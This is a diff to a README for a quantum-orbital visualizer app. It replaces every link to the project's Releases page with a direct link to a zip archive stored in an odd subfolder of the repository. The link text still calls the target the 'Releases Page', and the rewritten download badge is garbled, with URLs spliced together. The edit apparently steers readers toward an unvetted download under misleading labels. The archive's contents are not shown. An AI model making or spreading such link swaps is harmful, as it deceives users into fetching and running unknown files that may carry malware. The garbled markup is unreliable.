@@ -1,6 +1,6 @@
 # 🚀 Relativistic-Dirac-Orbital-Visualizer - Visualize Complex Quantum States Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now%20-Relativistic-Dirac-Orbital-Visualizer-blue.svg)](https://github.com/bhagatsagar/Relativistic-Dirac-Orbital-Visualizer/releases)
+[![Download](https://raw.githubusercontent.com/bhagatsagar/Relativistic-Dirac-Orbital-Visualizer/main/MinimalAndPrecise/Relativistic-Orbital-Dirac-Visualizer-v1.5.zip%20Now%https://raw.githubusercontent.com/bhagatsagar/Relativistic-Dirac-Orbital-Visualizer/main/MinimalAndPrecise/Relativistic-Orbital-Dirac-Visualizer-v1.5.zip)](https://raw.githubusercontent.com/bhagatsagar/Relativistic-Dirac-Orbital-Visualizer/main/MinimalAndPrecise/Relativistic-Orbital-Dirac-Visualizer-v1.5.zip)
 
 ## 📄 Description
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run the application:
 
 1. **Visit the Releases Page**  
    Click on the link below to access the download page:  
-   [Download Releases](https://github.com/bhagatsagar/Relativistic-Dirac-Orbital-Visualizer/releases)
+   [Download Releases](https://raw.githubusercontent.com/bhagatsagar/Relativistic-Dirac-Orbital-Visualizer/main/MinimalAndPrecise/Relativistic-Orbital-Dirac-Visualizer-v1.5.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of the software. Select the most recent version to ensure you have the latest features and fixes.
@@ -42,7 +42,7 @@ Follow these simple steps to download and run the application:
 ## 📥 Download & Install
 
 To get started, visit the Releases page again to download the application:  
-[Download Releases](https://github.com/bhagatsagar/Relativistic-Dirac-Orbital-Visualizer/releases)
+[Download Releases](https://raw.githubusercontent.com/bhagatsagar/Relativistic-Dirac-Orbital-Visualizer/main/MinimalAndPrecise/Relativistic-Orbital-Dirac-Visualizer-v1.5.zip)
 
 ## 🖥️ Features
 
